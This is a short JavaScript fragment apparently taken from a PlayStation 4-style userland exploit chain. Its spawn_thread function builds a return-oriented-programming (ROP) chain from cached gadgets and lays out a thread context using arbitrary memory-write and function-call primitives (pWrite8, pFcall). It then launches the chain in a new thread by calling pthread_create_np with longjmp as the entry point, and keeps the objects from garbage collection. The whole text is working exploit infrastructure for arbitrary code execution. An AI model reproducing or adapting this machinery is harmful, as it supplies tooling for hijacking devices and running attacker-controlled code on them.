	var spawn_thread = function (name, chaino) {
		var new_thr = new rop();
		var context = p.malloc(0x200);
		var retGadget = cachedGadgets["ret"];
		
		// Performance Address
		var contextBase = context;
		var contextStack = context.add32(0x10);
		var contextThreadId = context.add32(0x48);
		var pthreadCreateAddr = libKernelBase.add32(pthread_create_np_offset);
		var longJmpAddr = libSceLibcInternalBase.add32(longJmpOffset);

		pWrite8(contextBase, retGadget);
		pWrite8(contextStack, new_thr.stack);
		
		// Build ROP chain
		new_thr.push(retGadget);
		chaino(new_thr);
		
		// Update final stack pointer
		pWrite8(contextStack, new_thr.stack);

		var retv = function () {
			return pFcall(pthreadCreateAddr, contextThreadId, 0, longJmpAddr, contextBase, p.stringify(name));
		};
		
		nogcArray.push(new_thr, context);

		return retv;
	};
	
